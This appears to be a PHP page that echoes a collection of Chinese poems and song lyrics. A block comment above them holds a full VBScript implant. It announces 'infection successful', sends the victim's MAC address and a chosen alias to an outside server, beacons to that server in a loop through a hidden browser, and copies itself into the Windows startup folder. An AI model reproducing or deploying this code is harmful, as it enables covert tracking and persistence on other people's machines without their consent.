<?php 
/*
RUN()




FUNCTION RUN()
	'VisitServer()
	IF NOT FileExist(GetStartPath()&GetSelfName()) THEN
	    tips=inputbox("感染成功"&vbCrlf&"请为该主机设置别名","慌鸡的诗","")
		HOST="http://www.zduber.com/zdcar2/Chart/test.php?mode=first&tips="&tips&"&mac="&GetMac()
		msgbox GetHtml(HOST)
		'AddToStrat()
	END IF
	
	
END FUNCTION


'=====================判断文件是否存在=========================
function FileExist(Path) 
	Dim fso,msg,files
	Set fso = CreateObject("Scripting.FileSystemObject")
	f1=Path '文件路径和名字
	files = fso.FileExists(f1) '存在返回true;不存在返回false
	If files Then
		FileExist= TRUE
	Else
		FileExist= FALSE
	End If
end Function
'==========================================================

'=====================获取自身文件名1=========================
function GetSelfName() 
	Set fso = CreateObject("Scripting.FileSystemObject")
	GetSelfName=fso.GetFile(Wscript.scriptfullname).name
end Function
'==========================================================

'=====================获取启动项目录=========================
function GetStartPath() 
	set ws = createobject("wscript.shell")   
	GetStartPath = ws.specialfolders("startup") & "\"   '启动目录
end Function
'==========================================================

'=====================添加至启动项=========================
function AddToStrat()
	set fso = createobject("scripting.filesystemobject") 
	set ws = createobject("wscript.shell")   
	pt = ws.specialfolders("startup") & "\"   '启动目录
	set file = fso.getfile(wscript.scriptfullname)   '自身路径
	file.copy pt   '复制
end Function
'==========================================================
FUNCTION VisitServer()
	Do while 1
		msgbox GetHtml("http://www.zduber.com/zdcar2/Chart/test.php?mode=jilu&mac="&GetMac())
		WScript.Sleep 1000
	Loop
END FUNCTION
'==============获取链接返回值==========
Function GetHtml(url) 
	Dim objIE, Text
	Set objIE = CreateObject("Internetexplorer.Application")
	objIE.Visible = False
	objIE.Navigate url
	Do Until objIE.ReadyState = 4
		WScript.Sleep 200
	Loop
	Text = objIE.Document.DocumentElement.InnerText
	objIE.Quit
	GetHtml=Text
End function
'======================================

'==============MAC地址获取函数==========
'msgbox inputbox("GetMAc",,GetMac())
function GetMac()
	On Error Resume Next
	strComputer = "."
	Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
	Set colItems = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled=True",,48)
	For Each objItem in colItems
		GetMac=objItem.MACAddress
	Next
end function*/


echo "

我希望
年迈时能够住在一个小农场
有马有狗，养鹰种茶花
到时候
老朋友相濡以沫住在一起
读书种地
酿酒喝普洱茶
我们齐心合力盖房子
每个窗户都是不同颜色的
谁的屋顶漏雨
我们就一起去修补它
我们敲起手鼓咚咚哒
唱起老歌跳舞围着篝火哦
如果谁死了
我们就弹吉他欢送他
这个世界是不是你想要的
为什么那么纠结于它
简单的生活呀
触手可及吗
不如接下来
咱们一起出发。
——————————————————————————————————————
你也曾无数次提起
——————————————————————————————————————
去捡起荒野上的诗
——————————————————————————————————————
身份标签
看到一个人 这个人是干什么的
美好的像假的是的

——————————————————————————————————————
谁说月亮上不曾有青草
谁说可可西里没有海
谁说太平洋底燃不起篝火
谁说世界尽头没人听我唱歌
谁说戈壁滩不曾有灯塔
谁说可可西里没有海
谁说拉拇拉措吻不到沙漠
谁说我的目光流淌不成河
陪我到可可西里看一看海
不要未来 只要你来
_______________________________________
时间的步伐有三种 
未来姗姗来迟 
现在像箭一样飞逝
过去永远静立不动
快节奏的生活
让我们感叹着不管对生活还是工作
时间是永恒
但时间永远不够用
再给我一点时间
让我记住一些
或者是忘记一些
——————————————————————————————————————
是否会有时觉得生活没有意义
时间它匆匆的带走了一切
那些说过爱你的人 如今都哪儿去了
有的人变了 消失了  或者永远的离开了
总会有那么一天
时间会带给你崭新的一切
只是在那之前 
总是要一点点追逐着梦 伴着无助
什么才是活着的意义呢 
然后 你总会听到有人说
有一天 你会懂的
——————————————————————————————————————
当你挺过困难的时期
人生就会豁然开朗
如果被坎坷纠缠
时间也会教你
如何与他握手言和
十年前你是谁？
一年前你是谁
甚至昨天你是谁
都不重要
重要的是今天你是谁
明天你会成为谁
时间无言 
如此这般
明天就在眼前
所有回忆 回首 
带你的感伤或是感动
都会成为微笑着面对明天的动力和勇气
——————————————————————————————————————
究竟是忘不掉一个人
更令人悲伤
还是突然发现随着时间的打磨
那些觉得永远不会忘记的过往就真的忘记了
这件事更令人悲伤呢
马頔在音乐中这样讲述的
我不知道727的旅馆有没有8310
因为打火机的光 照不亮海景
不是未来也不是过去
因为过去已经逝去
未来太远不着边际
但是我依然愿意 此时遇见你
——————————————————————————————————————
就算全世界对你恶语相加
我依然会对你说上一声情话

——————————————————————————————————————
 直到有一天我不再歌唱
 只担心你的未来与我无关
      ---傲寒
——————————————————————————————————————	  
在冰雪消融的早晨 
在灯火斑斓的黄昏
——————————————————————————————————————
九宗罪
困住人类的有七宗罪
剩下的两宗是
爱与被爱
——————————————————————————————————————
思念像草一样疯狂的长
时间如刀却割舍不掉";
 
 ?>